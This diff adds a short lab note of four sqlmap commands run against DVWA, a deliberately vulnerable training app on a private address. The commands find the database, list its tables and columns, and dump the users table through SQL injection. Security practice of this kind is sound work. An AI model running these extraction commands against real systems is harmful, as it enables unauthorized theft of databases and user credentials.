@@ -1,0 +1,11 @@
+1.For find the databse name:
+sqlmap -u 'http://192.168.72.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' --current-db --batch 
+
+2. For find out the tables name:
+sqlmap -u 'http://192.168.72.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' -D dvwa --tables --batch 
+
+3. Fro find out the columns name form users table:
+sqlmap -u 'http://192.168.72.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' -D dvwa -T users --columns --batch 
+
+4. For dump all the data 
+sqlmap -u 'http://192.168.72.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' -D dvwa -T users --dump --batch 
